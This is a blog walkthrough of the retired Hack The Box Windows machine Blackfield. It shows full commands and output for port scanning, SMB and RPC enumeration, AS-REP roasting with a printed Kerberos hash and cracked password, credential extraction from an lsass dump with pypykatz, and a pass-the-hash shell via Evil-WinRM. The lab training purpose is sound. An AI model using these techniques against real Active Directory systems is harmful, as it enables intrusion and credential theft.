---
layout: post  
title: "Blackfield: Hack The Box Walkthrough"
date: 2020-10-04 09:59:22 +0000
last_modified_at: 2020-10-04 09:59:22 +0000
category: Walkthrough
tags: ["Hack The Box", Blackfield, retired, Windows, Hard]
comments: true
protect: false
image:
  feature: blackfield-htb-walkthrough.png
---

This post documents the complete walkthrough of Blackfield, a retired vulnerable [VM][1] created by [aas][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Blackfield is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let\'s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.192 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-09 12:28:04 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 53/tcp on 10.10.10.192
Discovered open port 445/tcp on 10.10.10.192
Discovered open port 135/tcp on 10.10.10.192
Discovered open port 88/tcp on 10.10.10.192
Discovered open port 3268/tcp on 10.10.10.192
Discovered open port 5985/tcp on 10.10.10.192
Discovered open port 593/tcp on 10.10.10.192
Discovered open port 389/tcp on 10.10.10.192
Discovered open port 53/udp on 10.10.10.192
```

Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p53,53,88,135,389,445,593,3268,5985 -A --reason 10.10.10.192 -oN nmap.txt
...
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain?       syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-06-09 19:55:21Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
...
Host script results:
|_clock-skew: 7h04m12s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-06-09T19:58:18
|_  start_date: N/A
```

Looks like we have some kind of Windows Server going on here. Since SMB is available, let's see what we can find out from it.

### SMB Enumeration

I'm using `smbclient` for this.

```
# smbclient -I 10.10.10.192 -L BLACKFIELD -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
```

`forensic` looks interesting but unfortunately I can't list it. Let's see what `profiles$` gives.

```
# smbclient -U'guest%' '//10.10.10.192/profiles$' -c ls
  .                                   D        0  Wed Jun  3 16:47:12 2020
  ..                                  D        0  Wed Jun  3 16:47:12 2020
  AAlleni                             D        0  Wed Jun  3 16:47:11 2020
  ABarteski                           D        0  Wed Jun  3 16:47:11 2020
  ABekesz                             D        0  Wed Jun  3 16:47:11 2020
  ABenzies                            D        0  Wed Jun  3 16:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 16:47:11 2020
  AChampken                           D        0  Wed Jun  3 16:47:11 2020
  ACheretei                           D        0  Wed Jun  3 16:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 16:47:11 2020
  AHigchens                           D        0  Wed Jun  3 16:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 16:47:11 2020
  AKlado                              D        0  Wed Jun  3 16:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 16:47:11 2020
  AKollolli                           D        0  Wed Jun  3 16:47:11 2020
  AKruppe                             D        0  Wed Jun  3 16:47:11 2020
  AKubale                             D        0  Wed Jun  3 16:47:11 2020
  ALamerz                             D        0  Wed Jun  3 16:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 16:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 16:47:11 2020
  ANavay                              D        0  Wed Jun  3 16:47:11 2020
  ANesterova                          D        0  Wed Jun  3 16:47:11 2020
  ANeusse                             D        0  Wed Jun  3 16:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 16:47:11 2020
  APustulka                           D        0  Wed Jun  3 16:47:11 2020
  ARotella                            D        0  Wed Jun  3 16:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 16:47:11 2020
  AShadaia                            D        0  Wed Jun  3 16:47:11 2020
  ASischo                             D        0  Wed Jun  3 16:47:11 2020
  ASpruce                             D        0  Wed Jun  3 16:47:11 2020
  ATakach                             D        0  Wed Jun  3 16:47:11 2020
  ATaueg                              D        0  Wed Jun  3 16:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 16:47:11 2020
  audit2020                           D        0  Wed Jun  3 16:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 16:47:11 2020
  AWorsey                             D        0  Wed Jun  3 16:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 16:47:11 2020
  BBakajza                            D        0  Wed Jun  3 16:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 16:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 16:47:11 2020
  BConsultant                         D        0  Wed Jun  3 16:47:11 2020
  BErdossy                            D        0  Wed Jun  3 16:47:11 2020
  BGeminski                           D        0  Wed Jun  3 16:47:11 2020
  BLostal                             D        0  Wed Jun  3 16:47:11 2020
  BMannise                            D        0  Wed Jun  3 16:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 16:47:11 2020
  BRigiero                            D        0  Wed Jun  3 16:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 16:47:11 2020
  BZandonella                         D        0  Wed Jun  3 16:47:11 2020
  CAcherman                           D        0  Wed Jun  3 16:47:12 2020
  CAkbari                             D        0  Wed Jun  3 16:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 16:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 16:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 16:47:12 2020
  CGronk                              D        0  Wed Jun  3 16:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 16:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 16:47:12 2020
  CHoytal                             D        0  Wed Jun  3 16:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 16:47:12 2020
  CKolbo                              D        0  Wed Jun  3 16:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 16:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 16:47:11 2020
  CSchandall                          D        0  Wed Jun  3 16:47:12 2020
  CSelters                            D        0  Wed Jun  3 16:47:12 2020
  CTolmie                             D        0  Wed Jun  3 16:47:12 2020
  DCecere                             D        0  Wed Jun  3 16:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 16:47:12 2020
  DCwilich                            D        0  Wed Jun  3 16:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 16:47:12 2020
  DKemesies                           D        0  Wed Jun  3 16:47:12 2020
  DMatuka                             D        0  Wed Jun  3 16:47:12 2020
  DMedeme                             D        0  Wed Jun  3 16:47:12 2020
  DMeherek                            D        0  Wed Jun  3 16:47:12 2020
  DMetych                             D        0  Wed Jun  3 16:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 16:47:12 2020
  DPriporov                           D        0  Wed Jun  3 16:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 16:47:12 2020
  DVellela                            D        0  Wed Jun  3 16:47:12 2020
  DVogleson                           D        0  Wed Jun  3 16:47:12 2020
  DZwinak                             D        0  Wed Jun  3 16:47:12 2020
  EBoley                              D        0  Wed Jun  3 16:47:12 2020
  EEulau                              D        0  Wed Jun  3 16:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 16:47:12 2020
  EFrixione                           D        0  Wed Jun  3 16:47:12 2020
  EJenorik                            D        0  Wed Jun  3 16:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 16:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 16:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 16:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 16:47:12 2020
  EPryar                              D        0  Wed Jun  3 16:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 16:47:12 2020
  ESariotti                           D        0  Wed Jun  3 16:47:12 2020
  ETurgano                            D        0  Wed Jun  3 16:47:12 2020
  EWojtila                            D        0  Wed Jun  3 16:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 16:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 16:47:12 2020
  FBroj                               D        0  Wed Jun  3 16:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 16:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 16:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 16:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 16:47:12 2020
  FPflum                              D        0  Wed Jun  3 16:47:12 2020
  FReffey                             D        0  Wed Jun  3 16:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 16:47:12 2020
  Gareld                              D        0  Wed Jun  3 16:47:12 2020
  GBatowski                           D        0  Wed Jun  3 16:47:12 2020
  GForshalger                         D        0  Wed Jun  3 16:47:12 2020
  GGomane                             D        0  Wed Jun  3 16:47:12 2020
  GHisek                              D        0  Wed Jun  3 16:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 16:47:12 2020
  GMerewether                         D        0  Wed Jun  3 16:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 16:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 16:47:12 2020
  GWiegard                            D        0  Wed Jun  3 16:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 16:47:12 2020
  HColantino                          D        0  Wed Jun  3 16:47:12 2020
  HConforto                           D        0  Wed Jun  3 16:47:12 2020
  HCunnally                           D        0  Wed Jun  3 16:47:12 2020
  HGougen                             D        0  Wed Jun  3 16:47:12 2020
  HKostova                            D        0  Wed Jun  3 16:47:12 2020
  IChristijr                          D        0  Wed Jun  3 16:47:12 2020
  IKoledo                             D        0  Wed Jun  3 16:47:12 2020
  IKotecky                            D        0  Wed Jun  3 16:47:12 2020
  ISantosi                            D        0  Wed Jun  3 16:47:12 2020
  JAngvall                            D        0  Wed Jun  3 16:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 16:47:12 2020
  JDanten                             D        0  Wed Jun  3 16:47:12 2020
  JDjouka                             D        0  Wed Jun  3 16:47:12 2020
  JKondziola                          D        0  Wed Jun  3 16:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 16:47:12 2020
  JLuthner                            D        0  Wed Jun  3 16:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 16:47:12 2020
  JPistachio                          D        0  Wed Jun  3 16:47:12 2020
  JScima                              D        0  Wed Jun  3 16:47:12 2020
  JSebaali                            D        0  Wed Jun  3 16:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 16:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 16:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 16:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 16:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 16:47:12 2020
  KCockeril                           D        0  Wed Jun  3 16:47:12 2020
  KColtart                            D        0  Wed Jun  3 16:47:12 2020
  KCyster                             D        0  Wed Jun  3 16:47:12 2020
  KDorney                             D        0  Wed Jun  3 16:47:12 2020
  KKoesno                             D        0  Wed Jun  3 16:47:12 2020
  KLangfur                            D        0  Wed Jun  3 16:47:12 2020
  KMahalik                            D        0  Wed Jun  3 16:47:12 2020
  KMasloch                            D        0  Wed Jun  3 16:47:12 2020
  KMibach                             D        0  Wed Jun  3 16:47:12 2020
  KParvankova                         D        0  Wed Jun  3 16:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 16:47:12 2020
  KRasmor                             D        0  Wed Jun  3 16:47:12 2020
  KShievitz                           D        0  Wed Jun  3 16:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 16:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 16:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 16:47:12 2020
  KZyballa                            D        0  Wed Jun  3 16:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 16:47:12 2020
  LBaligand                           D        0  Wed Jun  3 16:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 16:47:12 2020
  LBirer                              D        0  Wed Jun  3 16:47:12 2020
  LBobelis                            D        0  Wed Jun  3 16:47:12 2020
  LChippel                            D        0  Wed Jun  3 16:47:12 2020
  LChoffin                            D        0  Wed Jun  3 16:47:12 2020
  LCominelli                          D        0  Wed Jun  3 16:47:12 2020
  LDruge                              D        0  Wed Jun  3 16:47:12 2020
  LEzepek                             D        0  Wed Jun  3 16:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 16:47:12 2020
  LKarabag                            D        0  Wed Jun  3 16:47:12 2020
  LKirousis                           D        0  Wed Jun  3 16:47:12 2020
  LKnade                              D        0  Wed Jun  3 16:47:12 2020
  LKrioua                             D        0  Wed Jun  3 16:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 16:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 16:47:12 2020
  LMichoud                            D        0  Wed Jun  3 16:47:12 2020
  LTindall                            D        0  Wed Jun  3 16:47:12 2020
  LYturbe                             D        0  Wed Jun  3 16:47:12 2020
  MArcynski                           D        0  Wed Jun  3 16:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 16:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 16:47:12 2020
  MBrambini                           D        0  Wed Jun  3 16:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 16:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 16:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 16:47:12 2020
  MKillberg                           D        0  Wed Jun  3 16:47:12 2020
  MLapesh                             D        0  Wed Jun  3 16:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 16:47:12 2020
  MMerezio                            D        0  Wed Jun  3 16:47:12 2020
  MNaciri                             D        0  Wed Jun  3 16:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 16:47:12 2020
  MSichkar                            D        0  Wed Jun  3 16:47:12 2020
  MTemko                              D        0  Wed Jun  3 16:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 16:47:12 2020
  MTonuri                             D        0  Wed Jun  3 16:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 16:47:12 2020
  NBellibas                           D        0  Wed Jun  3 16:47:12 2020
  NDikoka                             D        0  Wed Jun  3 16:47:12 2020
  NGenevro                            D        0  Wed Jun  3 16:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 16:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 16:47:12 2020
  NPulido                             D        0  Wed Jun  3 16:47:12 2020
  NRonges                             D        0  Wed Jun  3 16:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 16:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 16:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 16:47:12 2020
  OBushey                             D        0  Wed Jun  3 16:47:12 2020
  OHardybala                          D        0  Wed Jun  3 16:47:12 2020
  OLunas                              D        0  Wed Jun  3 16:47:12 2020
  ORbabka                             D        0  Wed Jun  3 16:47:12 2020
  PBourrat                            D        0  Wed Jun  3 16:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 16:47:12 2020
  PBranti                             D        0  Wed Jun  3 16:47:12 2020
  PCapperella                         D        0  Wed Jun  3 16:47:12 2020
  PCurtz                              D        0  Wed Jun  3 16:47:12 2020
  PDoreste                            D        0  Wed Jun  3 16:47:12 2020
  PGegnas                             D        0  Wed Jun  3 16:47:12 2020
  PMasulla                            D        0  Wed Jun  3 16:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 16:47:12 2020
  PParakat                            D        0  Wed Jun  3 16:47:12 2020
  PProvencer                          D        0  Wed Jun  3 16:47:12 2020
  PTesik                              D        0  Wed Jun  3 16:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 16:47:12 2020
  PVirding                            D        0  Wed Jun  3 16:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 16:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 16:47:12 2020
  RBochare                            D        0  Wed Jun  3 16:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 16:47:12 2020
  RNemnich                            D        0  Wed Jun  3 16:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 16:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 16:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 16:47:12 2020
  RVallandas                          D        0  Wed Jun  3 16:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 16:47:12 2020
  RWissor                             D        0  Wed Jun  3 16:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 16:47:12 2020
  SAjowi                              D        0  Wed Jun  3 16:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 16:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 16:47:12 2020
  SBouzane                            D        0  Wed Jun  3 16:47:12 2020
  SChatin                             D        0  Wed Jun  3 16:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 16:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 16:47:12 2020
  SEulert                             D        0  Wed Jun  3 16:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 16:47:12 2020
  SGolds                              D        0  Wed Jun  3 16:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 16:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 16:47:12 2020
  SHauht                              D        0  Wed Jun  3 16:47:12 2020
  SHederian                           D        0  Wed Jun  3 16:47:12 2020
  SHelregel                           D        0  Wed Jun  3 16:47:12 2020
  SKrulig                             D        0  Wed Jun  3 16:47:12 2020
  SLewrie                             D        0  Wed Jun  3 16:47:12 2020
  SMaskil                             D        0  Wed Jun  3 16:47:12 2020
  Smocker                             D        0  Wed Jun  3 16:47:12 2020
  SMoyta                              D        0  Wed Jun  3 16:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 16:47:12 2020
  SReppond                            D        0  Wed Jun  3 16:47:12 2020
  SSicliano                           D        0  Wed Jun  3 16:47:12 2020
  SSilex                              D        0  Wed Jun  3 16:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 16:47:12 2020
  STousignaut                         D        0  Wed Jun  3 16:47:12 2020
  support                             D        0  Wed Jun  3 16:47:12 2020
  svc_backup                          D        0  Wed Jun  3 16:47:12 2020
  SWhyte                              D        0  Wed Jun  3 16:47:12 2020
  SWynigear                           D        0  Wed Jun  3 16:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 16:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 16:47:12 2020
  TCaffo                              D        0  Wed Jun  3 16:47:12 2020
  TCassalom                           D        0  Wed Jun  3 16:47:12 2020
  TEiselt                             D        0  Wed Jun  3 16:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 16:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 16:47:12 2020
  TKauten                             D        0  Wed Jun  3 16:47:12 2020
  TKnupke                             D        0  Wed Jun  3 16:47:12 2020
  TLintlop                            D        0  Wed Jun  3 16:47:12 2020
  TMusselli                           D        0  Wed Jun  3 16:47:12 2020
  TOust                               D        0  Wed Jun  3 16:47:12 2020
  TSlupka                             D        0  Wed Jun  3 16:47:12 2020
  TStausland                          D        0  Wed Jun  3 16:47:12 2020
  TZumpella                           D        0  Wed Jun  3 16:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 16:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 16:47:12 2020
  UPyrke                              D        0  Wed Jun  3 16:47:12 2020
  VBublavy                            D        0  Wed Jun  3 16:47:12 2020
  VButziger                           D        0  Wed Jun  3 16:47:12 2020
  VFuscca                             D        0  Wed Jun  3 16:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 16:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 16:47:12 2020
  VMarija                             D        0  Wed Jun  3 16:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 16:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 16:47:12 2020
  WSaldat                             D        0  Wed Jun  3 16:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 16:47:12 2020
  WZelazny                            D        0  Wed Jun  3 16:47:12 2020
  XBemelen                            D        0  Wed Jun  3 16:47:12 2020
  XDadant                             D        0  Wed Jun  3 16:47:12 2020
  XDebes                              D        0  Wed Jun  3 16:47:12 2020
  XKonegni                            D        0  Wed Jun  3 16:47:12 2020
  XRykiel                             D        0  Wed Jun  3 16:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 16:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 16:47:12 2020
  YKivlen                             D        0  Wed Jun  3 16:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 16:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 16:47:12 2020
  YPredestin                          D        0  Wed Jun  3 16:47:12 2020
  YSeturino                           D        0  Wed Jun  3 16:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 16:47:12 2020
  YVonebers                           D        0  Wed Jun  3 16:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 16:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 16:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 16:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 16:47:12 2020
  ZMiick                              D        0  Wed Jun  3 16:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 16:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 16:47:12 2020
  ZWausik                             D        0  Wed Jun  3 16:47:12 2020

                7846143 blocks of size 4096. 3232531 blocks available
```

To me, these look a hell lot like usernames and the ones starting with capital letters are distractions I suppose. Time for a little regular expression.

```
# smbclient -U'guest%' '//10.10.10.192/profiles$' -c ls | grep -E '^\s+[a-z]'
  audit2020                           D        0  Wed Jun  3 16:47:11 2020
  support                             D        0  Wed Jun  3 16:47:12 2020
  svc_backup                          D        0  Wed Jun  3 16:47:12 2020
```

### Do not require Kerberos preauthentication

Next up, we are going to examine if any of the users above enabled **Do not require Kerberos preauthentication** with Impacket's `GetNPUsers.py`.

```
# for user in $(cat usernames.txt); do python3 GetNPUsers.py -format john -no-pass "blackfield/$user" -dc-ip 10.10.10.192; echo; done
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for audit2020
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for support
$krb5asrep$support@BLACKFIELD:dd29dc4f77be81bee28b9bc706f6f646$71f493dc21fa6009f9f57bb4b527b6101ba2fac78661c088f5328e8d61d85963ec8b9095c03b95a6f2be9331cc15867b16801075854a7e70a1b26a5a0f5bf7415f69bd1f3a5caba9ddee0c40498c392b8416ab6b87185db7216d1771bd6b80615d6958b752b951a84bdbb6d62818e3b566062a31ad5da27ac34aa7775f0686463ed13c9fccd1658d642cfac9d49b5885bbdf8e97947a362a37e94d427d27ff3a0829785b9e175ad9146e46b81e0f32994f3cdc1ab9fe87c69043c6c1fcb09adec6ba4f994454d3276fece9ecae7a670c0d1cef8c7c377d6e10b7e51966230c158fd7bfe0e6ed0cfad6b70ba78db5

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc_backup
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

What have we here? `support` has enabled it. It didn't take long for JtR to crack the hash.

{% include image.html image_alt="d7ef2f91.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/d7ef2f91.png" %}

Armed with the password (`#00^BlackKnight`) of `support`, we can conduct further enumeration.

### RPC Enumeration

I'll be using the good ol' `rpcclient` to enumerate further. I'm particularly interesting in the following information:

1. Domain users
2. Domain password policy
2. Members of the builtin group **Remote Management Users**

The information above will help us determine our next steps.

#### Domain Users

```
# rpcclient -U'blackfield/support%#00^BlackKnight' 10.10.10.192 -c enumdomusers | grep -Ev BLACKFIELD
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
```

Looks like we have an extra user `lydericlefebvre` that didn't surfaced previously.

#### Domain password policy

```
# rpcclient -U'blackfield/support%#00^BlackKnight' 10.10.10.192 -c "getusrdompwinfo 0x585"
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE
```

Oh no, complex password policy is in place. Moving forward, brute-forcing of passwords is probably out of the question.

#### Members of the builtin group "Remote Management Users"

```
# rpcclient -U'blackfield/support%#00^BlackKnight' 10.10.10.192 -c "enumalsgroups builtin"
group:[Server Operators] rid:[0x225]
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]
```

Take note of the RID of the **Remote Management Users** (0x244).

```
# rpcclient -U'blackfield/support%#00^BlackKnight' 10.10.10.192 -c "queryaliasmem builtin 0x244"
        sid:[S-1-5-21-4194615774-2175524697-3563712290-1413]
```

Look up the SID next.

```
# rpcclient -U'blackfield/support%#00^BlackKnight' 10.10.10.192 -c "lookupsids S-1-5-21-4194615774-2175524697-3563712290-1413"
S-1-5-21-4194615774-2175524697-3563712290-1413 BLACKFIELD\svc_backup (1)
```

OK. We should be looking at getting access of `svc_backup` next.

### Accessing the `forensic` share

Wait a minute. What about the forensic share? The description stated it's a Forensic / Audit share and we have a `audit2020` account. Let's see what RPC has to say about this account.

```
rpcclient $> queryuser audit2020
        User Name   :   audit2020
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 01 Jan 1970 00:00:00 UTC
        Logoff Time              :      Thu, 01 Jan 1970 00:00:00 UTC
        Kickoff Time             :      Thu, 01 Jan 1970 00:00:00 UTC
        Password last set Time   :      Sun, 23 Feb 2020 11:49:46 UTC
        Password can change Time :      Mon, 24 Feb 2020 11:49:46 UTC
        Password must change Time:      Thu, 14 Sep 30828 02:48:05 UTC
        unknown_2[0..31]...
        user_rid :      0x44f
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

Hmm, interesting. Looks like a fresh account. Maybe `support` has delegated administrative rights to set password for `audit2020`?

{% include image.html image_alt="d7d794a5.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/d7d794a5.png" %}

Let's see if we can access the share.

{% include image.html image_alt="fcf77885.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/fcf77885.png" %}

Awesome. Looks we have a breach and the auditor and/or forensic investigator has put the forensic artifacts in this share.

#### Memory dump of `lsass.exe`

If we are to look for credentials of `svc_backup`, the memory dump of the `lsass.exe` process is our best bet.

{% include image.html image_alt="481fa937.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/481fa937.png" %}

The memory dump of `lsass.exe` is in `lsass.zip`. `pypykatz` is the Python implementation of Mimikatz—the right tool we need to analyze `lsass.DMP`.

{% include image.html image_alt="00f15d26.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/00f15d26.png" %}

## Low-Privilege Shell

Armed with the NT hash of `svc_backup`, we can utilize pass-the-hash technique to get a shell with Evil-WinRM like so.

{% include image.html image_alt="bb353889.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/bb353889.png" %}

